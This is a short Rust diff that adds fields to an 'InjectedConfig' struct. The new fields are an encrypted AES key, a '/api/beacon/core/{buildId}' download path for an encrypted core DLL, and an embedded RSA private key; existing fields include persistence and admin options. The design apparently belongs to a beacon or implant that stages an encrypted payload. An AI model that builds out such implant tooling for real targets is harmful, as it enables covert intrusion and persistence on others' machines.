@@ -317,4 +317,13 @@ pub struct InjectedConfig {
     pub require_admin: bool,
     pub copy_to_path: Option<String>,
     pub enable_persistence: bool,
+    /// Base64-encoded RSA-OAEP encrypted AES-256 key (for core DLL decryption)
+    #[serde(default)]
+    pub encrypted_aes_key: String,
+    /// Server path to download the encrypted core DLL, e.g. "/api/beacon/core/{buildId}"
+    #[serde(default)]
+    pub core_download_path: String,
+    /// Base64-encoded PKCS#8 DER RSA private key (for decrypting the AES key)
+    #[serde(default)]
+    pub rsa_private_key: String,
 }
